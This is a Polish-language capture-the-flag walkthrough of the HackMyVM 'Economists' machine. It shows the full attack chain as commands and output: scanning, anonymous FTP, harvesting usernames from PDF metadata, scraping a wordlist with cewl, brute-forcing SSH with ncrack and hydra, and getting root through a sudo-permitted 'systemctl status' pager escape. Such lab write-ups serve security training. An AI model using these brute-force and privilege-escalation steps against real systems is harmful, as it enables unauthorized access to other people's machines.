---
title: "Economists - eMVee"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - Economists
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Economists - eMVee
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|Economists|
|Autor:|[eMVee](https://hackmyvm.eu/profile/?user=eMVee)|
|Wypuszczony:|2023-10-10|
|Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Economists)|
|Poziom:|Łatwy|
|System:|Linux|
|Nauczysz się:| Web scraping, Bruteforce, Pdf info|

# 01. Wstęp
Maszynka **Economists**, której obraz nazywa się **Elite Economists**, a host **elite-economists** jest dosyć prostą maszyną. Wystarczy trochę umiejętnie poszukać, zeskrobać słowa ze strony, odpalić __bruteforce__ i koniec. Ale to wygląda tak prosto tylko w opisie. W maszynie jest trochę ślepych uliczek, które mogą utrudnić pracę, ale tylko tym osobom bardzo początkującym. Taka mała dygresja - ostatnio wirtualki odpalam w **Virtual Boxie** od razu na swoim **Windowsie** (tak, jako desktop używam Windowsa ;). Plus jest taki, że nie muszę nic przerabiać i mam pewność, że raczej zadziała, minusem zaś jest to, że wraz z wyłączeniem systemu, wyłącza się maszyna. Ale na **Proxmoxie** dobrze wiedzieć, jak to odpalić.
{: .text-justify}
# 02. Skanowanie
Zapuszczając proste skanowanie w **Metasploicie** widać, że:
{: .text-justify}
```bash
msf6 > db_nmap -A 172.16.1.178
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 16:32 CET
[*] Nmap: Nmap scan report for elite-economists.hmv (172.16.1.178)
[*] Nmap: Host is up (0.0011s latency).
[*] Nmap: Not shown: 997 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 3.0.3
[*] Nmap: | ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: | -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
[*] Nmap: | -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
[*] Nmap: | -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
[*] Nmap: | -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
[*] Nmap: | -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
[*] Nmap: |_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to ::ffff:172.16.1.89
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      At session startup, client count was 3
[*] Nmap: |      vsFTPd 3.0.3 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
[*] Nmap: |   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
[*] Nmap: |_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: |_http-server-header: Apache/2.4.41 (Ubuntu)
[*] Nmap: |_http-title: Home - Elite Economists
[*] Nmap: MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   1.08 ms elite-economists.hmv (172.16.1.178)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```
Port 21, 22 i 80 są otwarte. Czyli FTP, SSH i WWW.
{: .text-justify}
- **21/tcp** - FTP 
- **22/tcp** - SSH
- **80/tcp** - WWW


# 03. FTP
Najpierw należy sprawdzić, jaki jest dostęp na **FTP**. Być może w trybie __anonymous__. Można to sprawdzić wchodzą przez zwykłego __ftp-a__, albo użyć moduł z **Metasploita**. Polecam moduł, ponieważ z automatu zapiszę się to do zdobytych haseł.
{: .text-justify}
```bash
msf6 auxiliary(scanner/ftp/anonymous) > set rhosts 172.16.1.178
rhosts => 172.16.1.178

msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 172.16.1.178:21       - 172.16.1.178:21 - Anonymous READ (220 (vsFTPd 3.0.3))
[*] 172.16.1.178:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/anonymous) > creds 
Credentials
===========

host          origin        service       public     private              realm  private_type  JtR Format  cracked_password
----          ------        -------       ------     -------              -----  ------------  ----------  ----------------
172.16.1.178  172.16.1.178  21/tcp (ftp)  anonymous  mozilla@example.com         Password                  

```
Na tym ftp-ie mamy ciekawe pliki w formacie **.pdf**, które ściągamy sobie na dysk.
{: .text-justify}
# 03. PDF
Do uzyskania informacji o plikach _.*pdf_ polecam program **Pdfinfo** z pakietu **poppler-utils**(Kali).Wchodzimy do katalogu, gdzie mamy ściągnięte nasze pliki i odpalamy taki skrypt.
{: .text-justify}
```bash
for i in $(ls -1 *.pdf); do pdfinfo $i | grep '^Author:'| awk {'print $2'}; done | sort -u > users.txt
```
Zalecam wcześniej obejrzeć te dokumenty, zobaczyć czy czegoś dodatkowo nie ma, ale idę na skróty, żeby do końca nie zepsuć zabawy. Poniżej jest  jednolinijkowiec - jak się domyślacie, zgrywa użytkowników do pliku **users.txt**. Być może później się to przyda.
{: .text-justify}
```bash
for i in $(ls -1 *.pdf); do pdfinfo $i | grep '^Author:'| awk {'print $2'}; done | sort -u > users.txt
```
# 04. WWW
Strona jak strona, informacje, obrazki i tekst. **Dirb** ani **Feroxbuster** niczego ciekawego nie znalazł, oprócz dostępu do katalogów. Więc przyszedł czas na skrapowanie strony. Do tego - wg mnie - najlepiej nadaje się **Cewl**.
{: .text-justify}
```bash
cewl http://elite-economists.hmv/index.html > elite-economists.hmv.index.txt
cewl http://elite-economists.hmv/services.html > elite-economists.hmv.services.txt
cewl http://elite-economists.hmv/cases.html > elite-economists.hmv.cases.txt
cewl http://elite-economists.hmv/blog.html > elite-economists.hmv.blog.txt
cewl http://elite-economists.hmv/contact.html > elite-economists.hmv.contact.txt
```
Pozgrywałem wszystkie strony, chociaż były na nich podobne słowa, zebrałem wszystko w jedno i zlikwidowałem duble.
{: .text-justify}
```bash
cat *.txt | sort -u > elite-economists.hmv.all.txt
```
# 05. Bruteforce
Myślałem - a co tam - może się uda coś znaleźć, czyli __login__ i __hasło__ metodą słownikową i wejście na **SSH**. Użytkowników mamy, słowa też. Więc trzeba to połączyć Aby to znaleźć można użyć między innymi programy: **Hydra** i **Ncat**. Zobaczymy który szybciej to zrobi.
{: .text-justify}
## 05a. Ncrack
```bash
ncrack -v -U users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.178
```
```bash
Ncrack done: 1 service scanned in 362.97 seconds.
Probes sent: 2010 | timed-out: 0 | prematurely-closed: 1984

Rate: 8.43; Found: 0; About 38.64% done; ETC: 00:44 (0:04:05 remaining)
Stats: 0:02:44 elapsed; 0 services completed (1 total)
Rate: 7.42; Found: 0; About 41.56% done; ETC: 00:44 (0:03:52 remaining)
Discovered credentials on ssh://172.16.1.178:22 'joseph' 'wealthiest'
ssh://172.16.1.178:22 finished.

Discovered credentials for ssh on 172.16.1.178 22/tcp:
172.16.1.178 22/tcp ssh: 'joseph' '******'

Ncrack done: 1 service scanned in 362.97 seconds.
Probes sent: 2010 | timed-out: 0 | prematurely-closed: 1984

Ncrack finished.
```
## 05b. Hydra
```bash
hydra -v -L users.txt -P elite-economists.hmv.all ssh://elite-economists.hmv
```
```bash
hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 01:14:31

[STATUS] attack finished for 172.16.1.178 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 01:34:03

Discovered credentials for ssh on 172.16.1.178 22/tcp:
172.16.1.178 22/tcp ssh: 'joseph' '******'
```
Jak widzimy, **Ncrack** się uporał z tym w sześć minut i od razu zakończył, zaś **Hydrze** zajęło to dwadzieścia minut. Po złamaniu hasła dalej kontynuowała skanowanie. Pewnie jest opcja, żeby zakończyć skanowanie od razu po znalezieniu hasła, ale ja odpalałem wszystko z ustawień standardowych. Login i hasło jest jak się domyślacie - do **SSH**.
{: .text-justify}
# 06. root
Ostatni etap jest najprostszy, mimo, że jest dużo ślepych uliczek. Odpalamy:
```bash
sudo -l
```
i widzimy:
{: .text-justify}
```bash
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
```
Czyli jesteśmy w domu. **Systemctl** korzysta z pagera **Less**, a w w tym można uruchomić dowolną komendę, w tym __!bash__.
{: .text-justify}
Więc zadziałajmy:
{: .text-justify}
```bash
sudo /usr/bin/systemctl status
```
```bash
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Tue 2023-11-14 14:45:31 UTC; 31min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─1104 /lib/systemd/systemd --user
           │   │   └─1105 (sd-pam)
           │   └─session-1.scope 
           │     ├─1083 sshd: joseph [priv]
           │     ├─1227 sshd: joseph@pts/0
           │     ├─1228 -bash
           │     ├─1476 sudo /usr/bin/systemctl status
           │     ├─1477 /usr/bin/systemctl status
           │     └─1478 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─apache2.service 
             │ ├─747 /usr/sbin/apache2 -k start
             │ ├─937 /usr/sbin/apache2 -k start
             │ └─938 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─634 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─392 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─652 /usr/sbin/cron -f
             ├─polkit.service 
!bash
root@elite-economists:/home/joseph# id
uid=0(root) gid=0(root) groups=0(root)
```
